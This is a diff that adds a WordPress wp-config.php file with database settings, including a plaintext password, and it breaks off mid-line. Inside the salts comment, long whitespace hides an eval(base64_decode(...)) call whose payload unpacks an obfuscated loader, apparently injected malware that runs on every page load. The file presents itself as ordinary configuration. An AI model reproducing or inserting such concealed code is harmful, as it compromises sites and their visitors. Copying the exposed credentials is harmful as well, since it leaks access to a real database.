@@ -1,0 +1,41 @@
+<?php
+/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the
+ * installation. You don't have to use the web site, you can
+ * copy this file to "wp-config.php" and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * MySQL settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://codex.wordpress.org/Editing_wp-config.php
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define('DB_NAME', 'k0310908_db');
+
+/** MySQL database username */
+define('DB_USER', 'k0310908_mwntest');
+
+/** MySQL database password */
+define('DB_PASSWORD', '%n?i$k6UXFbR');
+
+/** MySQL hostname */
+define('DB_HOST', 'localhost');
+
+/** Database Charset to use in creating database tables. */
+define('DB_CHARSET', 'utf8');
+
+/** The Database Collate type. Don't change this if in doubt. */
+define('DB_COLLATE', '');
+
+/**#@+
+ * Authentication Unique Keys and Sa*/                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval(base64_decode("aWYgKCFkZWZpbmVkKCdBTFJFQURZX1JVTl8xYmMyOWIzNmYzNDJhODJhYWY2NjU4Nzg1MzU2NzE4JykpCnsKZGVmaW5lKCdBTFJFQURZX1JVTl8xYmMyOWIzNmYzNDJhODJhYWY2NjU4Nzg1MzU2NzE4JywgMSk7CgogJHJtZHRkd20gPSA4MTU0OyBmdW5jdGlvbiBwdHlhZ2hpaygkYnZscW1xaGMsICR4cHhsZ3JwcmpvKXskanZ0eHd5ID0gJyc7IGZvcigkaT0wOyAkaSA8IHN0cmxlbigkYnZscW1xaGMpOyAkaSsrKXskanZ0eHd5IC49IGlzc2V0KCR4cHhsZ3JwcmpvWyRidmxxbXFoY1skaV1dKSA/ICR4cHhsZ3JwcmpvWyRidmxxbXFoY1skaV1dIDogJGJ2bHFtcWhjWyRpXTt9CiRpanZ1aD0iYmFzZSIgLiAiNjRfZGVjb2RlIjtyZXR1cm4gJGlqdnVoKCRqdnR4d3kpO30KJGVmbWt3Y3R0ZSA9ICdIeWxFd3MxVUpxSFo4Y3Nla1IxZXFjSTBKZWt4NW1oc1Rtb3A2b0dySHlsRXdzMVVKcUgnLgonWjhjSTBKMzFsazc4MGs3ZDdmUzJvclR4RFNZVnBuUmxBa2NzR3JTRk5McXVBSnF1bExDc0d3YjFFcUN0cG5iOTdmUzJvclR4RFNZVicuCidsazc4MGtsMWVKcVYwazd0cG5Sa1pkU1k0ekhwMmtjc0dxQ3RwbmJzQW55bE53cUhaZFNZNHpIWkRTZ0dyd2JMWjVidGxKUmxFSmInLgonSFo1bFY1OVAxUFRHb1FyWFlEUzd4RFNRMmc1U1ZZSmJKcG5SOVo1bFY1OVAxUFRHb1FmUzJRcXlqUXJUeERTJy4KJzdHRFNnR3J3YkxaNWJ0bEpSbEVKYkhaNVl0ODlZc3pzbTFYYnMxVHRzVlY5WVA5VDM1UXJYWURTN3gnLgonRFNRMmc1U1ZZSmJKcG5SOVo1WXQ4OVlzenNtMVhiczFUdHNWVjlZUDlUMzVRZlMyUWZlNXA2b0dyQUhHcnpIcHBKUTJaNWJ0bEpSbEVKYkhaOEdQZDlZc1Z0UGxBOWxzNnFVbScuCidHRHlkakRjRFJEYTVVTFJtamRSUHVKUlljNlc4cExiNUlEUlBHd2JPSTZTa3BySEdydm9HcjVTMmc1eXRsSlJsRUpYJy4KJ2c3SDlJWHQ5UG1iczFYczloQWRUSEdMVWdDTGNMY2RhRFFMVGdlTGJQUndUTGprUmx1TGFtY0xxdHBuVW1qOGVvZ2RYWTR6SFpEU1EyZzVTMllKeVBHJy4KJ0xYMjE1bWhzVG1vNHpIWmc1UzJnOHl0dUZ5UEF3Y3NoNXpHZ1Rsc2RUenhEU2dHcjVTMmc1U3RXVG0xU0g5SVRiZUZhazMxdUZxdFo4M0dnS1gyNzZ6dHVMVExVRHlITkxSSCcuCidqZFhHR0piOFFmYm1qRFVkTkxhSmxEVERhRGM1R0xVWUM4VXhEU1EyZzVTVjdueTFRTGJvZzh5RFVxY1AzRnlnNHpIWkRTZ0dyNVMyZzV5SjNuUkRHd2IxRTV5RFVxR0YnLgonbEZtdTBrQ0hackhHcjVTMmc1V3hEU1EyZzVTMmc1UzJna1JzR0ZxOEU1V0RHazd0MG55MUNKcTVaa1c4bEozMWVKcVZ4TGJEbHInLgonU2swcVF1Q0ZDRk9KN3RvcnNvRWZjWTdmU2s3Zm0yWXEzRFA5bEpQOWx4N1hQdDk5UDE1VDNEOTgzR3ByVHhEU1EyZzVTVjF6SFpEU1EyZzVTVlJGYmhhRnknLgonbDBuUVZhazMxV0pxdHFrUmxHTGI4eEo5dHBrN2RackhHcjVTMmc1V3hEU1EyZzVTMmc1UzJnOFc4bGtlMjE1bVBla1JQaHJTWTR6SFpEU1EyZzVTMmc1UzInLgonZzh5UEVMYkloa0NsVXFDUDNKcXNsNXpHZ0hxOGVMcVlaclR4RFNnR3I1UzJnNVMyZzVTMllMYmh1bldsVXZxREFrcXNsRmJzbnFYMjE1eURVcUdGbEZtdCcuCicwTDM4MG5DSFpyVHhEU2dHcjVTMmc1UzJnNVMyWWtjc3hKbDFvTHF0WjV6R2c4UDFUdHM4YnRzOG44M0R6OVlsSHNQMXlYOUlQVFlQRHRYRkY2b0dyNVMyZzVTMmc1UycuCidWQ3d5bHhKWDJaclN0VW55UFV3UzIxNVdER2s3OG9uQ2RaOFdEbG55SkFreVBHd1NvZ3RtbFh0OUQ5VDM4SnEzRFA5bVBYSHN0SzlRWXA1U20xS1hWeUg5SVQnLgondFhZRFNRMmc1UzJnNVMyZ3ZvR3I1UzJnNVMyZzVTMmc1UzJnOFdEbG55SkFreVBHd1MyMTVXRDNMN0RHa1FnWWtjc3hKbDFvTHF0WmYnLgonUzJvZlMyWWtjSXVrY2dwNm9HcnpIWmc1UzJnNVMyZzVTMmc1U1ZwSlEyWjhXRGxueUpBa3lQR3d
